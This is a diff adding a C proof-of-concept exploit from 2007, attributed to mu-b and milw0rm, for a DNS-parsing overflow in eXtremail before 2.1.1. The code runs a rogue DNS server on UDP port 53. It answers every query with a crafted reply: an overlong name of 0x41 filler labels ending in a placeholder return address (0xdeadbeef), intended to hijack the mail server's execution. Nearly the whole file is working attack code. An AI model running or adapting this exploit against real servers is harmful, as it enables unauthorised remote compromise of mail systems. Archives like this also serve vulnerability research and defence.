@@ -1,0 +1,140 @@
+/* extremail-v9.c
+ *
+ * Copyright (c) 2007 by <mu-b@digit-labs.org>
+ *
+ * eXtremail <2.1.1 remote root POC (x86-lnx)
+ * by mu-b - Tue Feb 6 2007
+ *
+ * - Tested on: eXtremail 2.1.0 (lnx)
+ *              eXtremail 2.1.1 (lnx)
+ *
+ * POC for DNS parsing bugs...
+ *
+ * This program is free software; you can redistribute it and/or modify
+ * it under the terms of the GNU General Public License as published by
+ * the Free Software Foundation; version 2 of the License.
+ *
+ * This program is distributed in the hope that it will be useful,
+ * but WITHOUT ANY WARRANTY; without even the implied warranty of
+ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ * GNU General Public License for more details.
+ *
+ * http://www.digit-labs.org/ -- Digit-Labs 2007!@$!
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+#define DNS_HDR_LEN   12
+#define DNS_TRAIL_LEN 20
+
+#define DNS_PORT      53
+#define DNS_MAX_MSG   0x200
+
+#define HAMMER_LEN    284
+
+static char * dns_hdr_buf =
+  "\x69\x69"  /* transaction id */
+  "\x81\x80"  /* flags */
+  "\x00\x01"  /* questions */
+  "\x00\x01"  /* answers rrs */
+  "\x00\x00"  /* authority rrs */
+  "\x00\x00"; /* additional rrs */
+
+static char * dns_trail_buf =
+  "\x00\x01"          /* type */
+  "\x00\x01"          /* class */
+  /* Answers */
+  "\xc0\x0c"          /* name ptr */
+  "\x00\x01"          /* type */
+  "\x00\x01"          /* class */
+  "\x00\x01\x51\x80"  /* ttl (1 day) */
+  "\x00\x04"          /* data length */
+  "\xff\xff\xff\xff"; /* 255.255.255.255 */
+
+int
+main (int argc, char *argv[])
+{
+  int sock, result;
+  struct sockaddr_in cliaddr, servaddr;
+
+  printf ("eXtremail 2.1.1 remote root POC\n"
+          "by: <mu-b@digit-labs.org>\n"
+          "http://www.digit-labs.org/ -- Digit-Labs 2007!@$!\n\n");
+
+  sock = socket (AF_INET, SOCK_DGRAM, 0);
+  if (sock < 0)
+    {
+      perror ("socket()");
+      exit (EXIT_FAILURE);
+    }
+
+  servaddr.sin_family = AF_INET;
+  servaddr.sin_addr.s_addr = htonl (INADDR_ANY);
+  servaddr.sin_port = htons (DNS_PORT);
+  result = bind (sock, (struct sockaddr *) &servaddr, sizeof servaddr);
+  if (result < 0)
+    {
+      perror ("bind()");
+      exit (EXIT_FAILURE);
+    }
+
+  printf ("+Waiting for data on port %d...\n", DNS_PORT);
+
+  while (1)
+    {
+      int n, clilen, curlen, len;
+      char rbuf[DNS_MAX_MSG], sbuf[DNS_MAX_MSG*4];
+      char *ptr;
+
+      memset (rbuf, 0, sizeof rbuf);
+      memset (sbuf, 0, sizeof sbuf);
+
+      /* receive message */
+      clilen = sizeof cliaddr;
+      n = recvfrom (sock, rbuf, DNS_MAX_MSG, 0, (struct sockaddr *) &cliaddr, &clilen);
+
+      if (n < 0)
+        {
+          printf ("- cannot receive data!\n");
+          continue;
+        }
+
+      /* print received message */
+      printf ("+ Connection from %s: %u\n",
+              inet_ntoa (cliaddr.sin_addr),
+              ntohs (cliaddr.sin_port));
+
+      /* formulate reply */
+      ptr = sbuf;
+      memcpy (ptr, dns_hdr_buf, DNS_HDR_LEN);
+      ptr += DNS_HDR_LEN;
+
+      for (len = 0; len < HAMMER_LEN; ptr += curlen)
+      {
+        if (len + 63 > HAMMER_LEN)
+          curlen = HAMMER_LEN - len;
+        else
+          curlen = 63;
+
+        len += curlen;
+        *ptr++ = curlen;
+        memset (ptr, 0x41, curlen);
+      }
+
+      *((unsigned long *)(ptr - 4)) = 0xdeadbeef;
+      *ptr++ = 0x00;
+      memcpy (ptr, dns_trail_buf, DNS_TRAIL_LEN);
+      ptr += DNS_TRAIL_LEN;
+
+      n = sendto (sock, sbuf, ptr-sbuf, 0, (struct sockaddr *) &cliaddr, clilen);
+    }
+
+  return (EXIT_SUCCESS);
+}
+
+// milw0rm.com [2007-04-20]
